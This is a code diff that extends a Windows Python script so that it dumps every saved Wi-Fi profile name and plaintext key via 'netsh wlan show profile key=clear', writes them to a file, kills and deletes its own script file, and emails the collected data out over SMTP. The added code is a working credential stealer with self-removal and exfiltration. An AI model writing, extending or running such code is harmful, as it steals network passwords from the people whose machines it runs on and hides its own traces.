@@ -68,7 +68,8 @@ if os.name == "nt":
             knj = jungkook+1
             try:
                 while "All" not in next_word:
-                    next_word += " " + words_list[words_list.index(wordblk) + knj]
+                    next_word += " " + \
+                        words_list[words_list.index(wordblk) + knj]
                     knj += 1
             except:
                 pass
@@ -80,3 +81,46 @@ if os.name == "nt":
                     next_word = next_word.replace(' ', "")
             wifi = subprocess.check_output('netsh wlan show profile ' + '"' + next_word + '"' + ' key=clear',
                                            shell=True)
+            wifi = str(wifi)
+            start = wifi.find("Key Content")
+            end = wifi.find("Cost settings")
+            key_content = "Content"
+            substring = wifi[start:end]
+            words_list = wifi.split()
+            with open(file_path + "\\" + sys_info, "a") as f:
+                f.write(next_word + "\n")
+                f.close()
+            jungkook += 5
+            try:
+                next_word = words_list[words_list.index(key_content) + 2]
+                i = 2
+                for words in wifi.split():
+                    if words == "Content":
+                        next_word = words_list[words_list.index(
+                            key_content) + i]
+                        next_word = next_word.split('\\r\\n\\r\\nCost')[0]
+                        next_word = next_word.replace(' ', "\\ ")
+                        i = i + 5
+                        with open(file_path + "\\" + sys_info, "a") as f:
+                            f.write(" : " + next_word + "\n")
+                            f.close()
+            except:
+                pass
+    try:
+        passwd = os.path.abspath(os.getcwd())
+        os.system("cd " + passwd)
+        os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+        print('File was closed.')
+        os.system("DEL " + os.path.basename(__file__))
+    except OSError:
+        print('File is close.')
+
+    with open(sys_info) as f:
+        lines = f.read()
+
+    print(str(lines))
+    message += str(lines)
+
+    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
+        server.login(YOUR_USERNAME, YOUR_PASSWORD)
+        server.sendmail(sender, receiver, message)
